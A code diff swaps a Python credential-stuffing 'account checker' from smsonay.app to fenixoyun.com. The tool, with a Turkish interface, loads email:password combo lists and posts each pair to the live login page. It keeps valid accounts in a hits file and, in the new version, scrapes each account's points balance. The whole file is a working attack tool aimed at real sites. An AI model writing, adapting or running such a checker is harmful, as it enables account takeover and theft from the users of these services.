@@ -1,153 +1,176 @@
 import requests
-import tkinter as tk
-from tkinter import messagebox, filedialog
+import re
+import time
 import threading
-import random
-import math
-import os
+import customtkinter as ctk
+from tkinter import filedialog, messagebox
 
-# === DOSYA AYARLARI ===
-HITS_FILE = "hits.txt"
-FAILS_FILE = "fails.txt"
+# --- Arayüz Ayarları ---
+ctk.set_appearance_mode("Dark")
+ctk.set_default_color_theme("blue")
 
-class SMSOnayChecker:
+class FenixCheckerGUI(ctk.CTk):
     def __init__(self):
-        self.accounts = []
-        self.running = False
-        self.hits = 0
-        self.fails = 0
+        super().__init__()
 
-    def load_file(self):
-        # DOSYA SEÇME PENCERESİ
-        file_path = filedialog.askopenfilename(
-            title="Hesap Listesini Seç (USER:PASS)", 
-            filetypes=[("Text files", "*.txt")]
-        )
-        if file_path:
-            try:
-                with open(file_path, "r", encoding="utf-8") as f:
-                    self.accounts = [line.strip() for line in f if ":" in line]
-                status_label.config(text=f"{len(self.accounts)} hesap yüklendi.", fg="#00ff00")
-                messagebox.showinfo("Başarılı", f"{len(self.accounts)} hesap yüklendi!")
-            except Exception as e:
-                messagebox.showerror("Hata", f"Dosya hatası: {e}")
+        self.title("FenixOyun Account Checker v1.0")
+        self.geometry("700x550")
 
-    def check_logic(self, email, password):
-        url = "https://smsonay.app/panel/ajax/login"
-        headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Accept": "*/*"
+        # Değişkenler
+        self.input_file_path = ""
+        self.is_running = False
+        self.hit_count = 0
+        self.bad_count = 0
+        self.error_count = 0
+        self.delay = 1.5
+
+        self.setup_ui()
+
+    def setup_ui(self):
+        # Ana Frame
+        self.grid_columnconfigure(0, weight=1)
+        
+        # Başlık
+        self.label_title = ctk.CTkLabel(self, text="FENIXOYUN CHECKER", font=ctk.CTkFont(size=24, weight="bold"))
+        self.label_title.grid(row=0, column=0, pady=20)
+
+        # Dosya Seçme Alanı
+        self.file_frame = ctk.CTkFrame(self)
+        self.file_frame.grid(row=1, column=0, padx=20, pady=10, sticky="ew")
+        
+        self.btn_browse = ctk.CTkButton(self.file_frame, text="Dosya Seç (.txt)", command=self.browse_file)
+        self.btn_browse.grid(row=0, column=0, padx=10, pady=10)
+        
+        self.label_file = ctk.CTkLabel(self.file_frame, text="Henüz dosya seçilmedi...", text_color="gray")
+        self.label_file.grid(row=0, column=1, padx=10, pady=10)
+
+        # İstatistik Paneli
+        self.stats_frame = ctk.CTkFrame(self)
+        self.stats_frame.grid(row=2, column=0, padx=20, pady=10, sticky="ew")
+        self.stats_frame.grid_columnconfigure((0,1,2), weight=1)
+
+        self.lbl_hit = ctk.CTkLabel(self.stats_frame, text="HIT: 0", text_color="#2ecc71", font=ctk.CTkFont(size=16, weight="bold"))
+        self.lbl_hit.grid(row=0, column=0, pady=10)
+
+        self.lbl_bad = ctk.CTkLabel(self.stats_frame, text="BAD: 0", text_color="#e74c3c", font=ctk.CTkFont(size=16, weight="bold"))
+        self.lbl_bad.grid(row=0, column=1, pady=10)
+
+        self.lbl_err = ctk.CTkLabel(self.stats_frame, text="ERROR: 0", text_color="#f1c40f", font=ctk.CTkFont(size=16, weight="bold"))
+        self.lbl_err.grid(row=0, column=2, pady=10)
+
+        # Log Ekranı
+        self.log_text = ctk.CTkTextbox(self, width=600, height=200)
+        self.log_text.grid(row=3, column=0, padx=20, pady=10, sticky="nsew")
+
+        # Kontrol Butonları
+        self.control_frame = ctk.CTkFrame(self, fg_color="transparent")
+        self.control_frame.grid(row=4, column=0, pady=20)
+
+        self.btn_start = ctk.CTkButton(self.control_frame, text="BAŞLAT", fg_color="#27ae60", hover_color="#219150", command=self.start_checking)
+        self.btn_start.grid(row=0, column=0, padx=10)
+
+        self.btn_stop = ctk.CTkButton(self.control_frame, text="DURDUR", fg_color="#c0392b", hover_color="#a93226", command=self.stop_checking, state="disabled")
+        self.btn_stop.grid(row=0, column=1, padx=10)
+
+    def browse_file(self):
+        file = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
+        if file:
+            self.input_file_path = file
+            self.label_file.configure(text=file.split("/")[-1], text_color="white")
+
+    def log(self, message):
+        self.log_text.insert("end", f"[{time.strftime('%H:%M:%S')}] {message}\n")
+        self.log_text.see("end")
+
+    def try_login(self, email, password):
+        session = requests.Session()
+        headers_get = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/128.0.0.0",
         }
-        payload = {"email": email, "password": password}
+
         try:
-            response = requests.post(url, data=payload, headers=headers, timeout=10)
-            if '{"success":true,"' in response.text: return "SUCCESS"
-            elif 'success":false' in response.text or 'Ba\\u015far\\u0131s\\u0131z' in response.text: return "FAILURE"
-            return "ERROR"
-        except: return "RETRY"
+            session.get("https://fenixoyun.com/giris", headers=headers_get, timeout=10)
+            ocsessid = session.cookies.get("OCSESSID")
+            if not ocsessid: return "ERROR", "Cookie alınamadı"
 
-    def worker(self, log_func):
-        for acc in self.accounts:
-            if not self.running: break
-            try:
-                user, pwd = acc.split(":", 1)
-                res = self.check_logic(user, pwd)
-                if res == "SUCCESS":
-                    self.hits += 1
-                    with open(HITS_FILE, "a") as f: f.write(f"{user}:{pwd}\n")
-                    log_func(f"[HIT] {user}", "#00ff00")
-                else:
-                    self.fails += 1
-                    with open(FAILS_FILE, "a") as f: f.write(f"{user}:{pwd}\n")
-                    log_func(f"[FAIL] {user}", "#ff3333")
-                
-                stats_label.config(text=f"HITS: {self.hits} | FAILS: {self.fails} | KALAN: {len(self.accounts)-(self.hits+self.fails)}")
-            except: continue
-        self.running = False
+            login_data = {"email": (None, email.strip()), "password": (None, password.strip())}
+            headers_post = {
+                "Referer": "https://fenixoyun.com/giris",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/128.0.0.0",
+                "Cookie": f"OCSESSID={ocsessid}; language=tr-tr;",
+            }
 
-# === UI TASARIM ===
-def start_app():
-    checker = SMSOnayChecker()
-    root = tk.Tk()
-    root.title("https://smsonay.app/panel/ajax/login Checker - WASD POWER")
-    root.geometry("900x650")
-    root.configure(bg="#050505")
+            resp = session.post("https://fenixoyun.com/giris", data=login_data, headers=headers_post, timeout=12)
+            html = resp.text.lower()
 
-    # --- CANVAS (ARKAPLAN WASD) ---
-    canvas = tk.Canvas(root, bg="#050505", highlightthickness=0)
-    canvas.place(x=0, y=0, relwidth=1, relheight=1)
+            if "e-posta adresiniz ya da parolanız yanlış!" in html:
+                return "BAD", None
+            
+            if "siparişlerim" in html:
+                bakiye = "Bulunamadı"
+                match = re.search(r'puan bakiyeniz</div><div class="fx-points-value">(.*?)</div>', resp.text, re.IGNORECASE | re.DOTALL)
+                if match: bakiye = match.group(1).strip()
+                return "HIT", bakiye
+            
+            return "UNKNOWN", None
+        except Exception as e:
+            return "ERROR", str(e)
 
-    particles = []
-    for _ in range(250):
-        size = random.randint(10, 25)
-        p = canvas.create_text(random.randint(0, 900), random.randint(0, 650),
-                               text="WASD", font=("Arial", size, "bold"),
-                               fill=random.choice(["#111", "#1a1a1a", "#222"]))
-        particles.append([p, random.uniform(-0.8, 0.8), random.uniform(-1.2, -0.4)])
-
-    def animate():
-        mx, my = root.winfo_pointerx() - root.winfo_rootx(), root.winfo_pointery() - root.winfo_rooty()
-        for p in particles:
-            canvas.move(p[0], p[1], p[2])
-            pos = canvas.coords(p[0])
-            if pos:
-                dist = math.sqrt((pos[0]-mx)**2 + (pos[1]-my)**2)
-                if dist < 130: canvas.move(p[0], (pos[0]-mx)/8, (pos[1]-my)/8)
-                if pos[1] < -50: canvas.coords(p[0], random.randint(0, 900), 680)
-        canvas.tag_lower("all")
-        root.after(25, animate)
-
-    # --- ANA PANEL (SABİT KONUMLANDIRMA) ---
-    main_frame = tk.Frame(root, bg="#0e0e0e", bd=1)
-    main_frame.place(x=100, y=50, width=700, height=550)
-
-    tk.Label(main_frame, text="SMSONAY ACCOUNT CHECKER v4", fg="#6366f1", bg="#0e0e0e", font=("Arial", 18, "bold")).place(x=180, y=20)
-    
-    global status_label, stats_label
-    status_label = tk.Label(main_frame, text="Liste Bekleniyor...", fg="#555", bg="#0e0e0e", font=("Arial", 10))
-    status_label.place(x=280, y=60)
-
-    stats_label = tk.Label(main_frame, text="HITS: 0 | FAILS: 0 | KALAN: 0", fg="white", bg="#0e0e0e", font=("Arial", 12, "bold"))
-    stats_label.place(x=220, y=90)
-
-    # Console Alanı
-    console = tk.Text(main_frame, bg="#050505", fg="#888", font=("Consolas", 10), relief="flat")
-    console.place(x=30, y=130, width=640, height=300)
-    console.config(state="disabled")
-
-    def log_to_console(text, color):
-        console.config(state="normal")
-        console.insert("end", text + "\n", color)
-        console.tag_config(color, foreground=color)
-        console.see("end")
-        console.config(state="disabled")
-
-    def start_thread():
-        if not checker.accounts:
-            messagebox.showwarning("Hata", "Dayı önce listeyi yükle!")
+    def worker(self):
+        try:
+            with open(self.input_file_path, "r", encoding="utf-8", errors="ignore") as f:
+                lines = f.readlines()
+        except Exception as e:
+            self.log(f"Hata: {e}")
             return
-        checker.running = True
-        threading.Thread(target=checker.worker, args=(log_to_console,), daemon=True).start()
 
-    # --- BUTONLAR (TAMAMEN SABİT) ---
-    # LİSTE YÜKLE BUTONU
-    btn_load = tk.Button(main_frame, text="LİSTE YÜKLE (.txt)", bg="#2a2a2a", fg="white", relief="flat", 
-                         font=("Arial", 10, "bold"), command=checker.load_file, cursor="hand2")
-    btn_load.place(x=30, y=450, width=200, height=50)
+        for line in lines:
+            if not self.is_running: break
+            line = line.strip()
+            if ":" not in line: continue
 
-    # BAŞLAT BUTONU
-    btn_start = tk.Button(main_frame, text="BAŞLAT", bg="#6366f1", fg="white", relief="flat", 
-                          font=("Arial", 10, "bold"), command=start_thread, cursor="hand2")
-    btn_start.place(x=250, y=450, width=200, height=50)
+            email, password = line.split(":", 1)
+            status, info = self.try_login(email, password)
 
-    # DURDUR BUTONU
-    btn_stop = tk.Button(main_frame, text="DURDUR", bg="#ef4444", fg="white", relief="flat", 
-                         font=("Arial", 10, "bold"), command=lambda: setattr(checker, 'running', False), cursor="hand2")
-    btn_stop.place(x=470, y=450, width=200, height=50)
+            if status == "HIT":
+                self.hit_count += 1
+                self.lbl_hit.configure(text=f"HIT: {self.hit_count}")
+                self.log(f"HIT ✓ {email} | Bakiye: {info}")
+                with open("hit.txt", "a", encoding="utf-8") as f_hit:
+                    f_hit.write(f"HIT | {email}:{password} | Bakiye: {info}\n")
+            elif status == "BAD":
+                self.bad_count += 1
+                self.lbl_bad.configure(text=f"BAD: {self.bad_count}")
+            else:
+                self.error_count += 1
+                self.lbl_err.configure(text=f"ERROR: {self.error_count}")
+                self.log(f"Hata: {email} -> kulllanıcı adı ve şifre yanlış")
 
-    animate()
-    root.mainloop()
+            time.sleep(self.delay)
+
+        self.log("İşlem bitti.")
+        self.stop_checking()
+
+    def start_checking(self):
+        if not self.input_file_path:
+            messagebox.showwarning("Uyarı", "Lütfen önce bir dosya seçin!")
+            return
+        
+        self.is_running = True
+        self.btn_start.configure(state="disabled")
+        self.btn_stop.configure(state="normal")
+        self.log("Checker başlatıldı...")
+        
+        # UI'ı dondurmamak için thread kullanıyoruz
+        thread = threading.Thread(target=self.worker, daemon=True)
+        thread.start()
+
+    def stop_checking(self):
+        self.is_running = False
+        self.btn_start.configure(state="normal")
+        self.btn_stop.configure(state="disabled")
+        self.log("Checker durduruldu.")
 
 if __name__ == "__main__":
-    start_app()
+    app = FenixCheckerGUI()
+    app.mainloop()
